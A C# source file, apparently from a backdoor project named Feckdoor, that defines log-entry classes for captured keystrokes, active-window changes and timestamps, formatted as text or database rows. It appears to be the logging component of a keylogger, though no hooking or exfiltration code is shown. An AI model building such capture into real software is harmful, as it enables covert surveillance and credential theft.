using System.Text;

namespace Feckdoor.InputLog
{
	internal abstract class InputLogEntry
	{
		public DateTime Timestamp
		{
			get; protected set;
		}

		public abstract string PlainTextMessage
		{
			get;
		}

		public abstract object[] DbMessage
		{
			get;
		}

		protected InputLogEntry(DateTime timeStamp)
		{
			Timestamp = timeStamp;
		}
	}

	internal class KeyLogEntry : InputLogEntry
	{
		private readonly KeyboardInputEventArgs Args;
		private string KeyString;

		public override string PlainTextMessage
		{
			get
			{
				if (KeyString.Length > 1)
					KeyString = $"[{KeyString}]";

				return KeyString + (KeyString.EndsWith("Enter]", StringComparison.InvariantCultureIgnoreCase) ? Environment.NewLine : "");
			}
		}

		public override object[] DbMessage => new object[] { KeyString, Args.VkCode, Args.ScanCode, Args.Modifier };

		public KeyLogEntry(DateTime timeStamp, KeyboardInputEventArgs args, string key) : base(timeStamp)
		{
			Args = args;
			KeyString = key;
		}
	}

	internal class ActiveWindowChangeEntry : InputLogEntry
	{
		private readonly ActiveWindowInfo WindowInfo;

		public override string PlainTextMessage
		{
			get
			{
				var sb = new StringBuilder();
				sb.AppendLine(Environment.NewLine);
				sb.AppendLine("##### Active window change #####");
				sb.Append("Time: ").AppendLine(Timestamp.ToString()); // todo: format support
				sb.Append("Name: ").AppendLine(WindowInfo.Name);
				sb.Append("Executable: ").AppendLine(WindowInfo.Executable);
				sb.AppendLine("##### Active window change #####");
				return sb.ToString();
			}
		}

		public override object[] DbMessage
		{
			get => new object[] { WindowInfo.Name, WindowInfo.Executable };
		}

		public ActiveWindowChangeEntry(DateTime timeStamp, ActiveWindowInfo info) : base(timeStamp)
		{
			WindowInfo = info;
		}
	}

	internal class TimestampEntry : InputLogEntry
	{
		private readonly string Format;

		public override string PlainTextMessage
		{
			get
			{
				return Environment.NewLine + "--- " + Timestamp.ToString(Format) + " ---" + Environment.NewLine;
			}
		}

		public override object[] DbMessage
		{
			get => new object[] { };
		}

		public TimestampEntry(DateTime timeStamp, string format) : base(timeStamp)
		{
			Format = format;
		}
	}
}
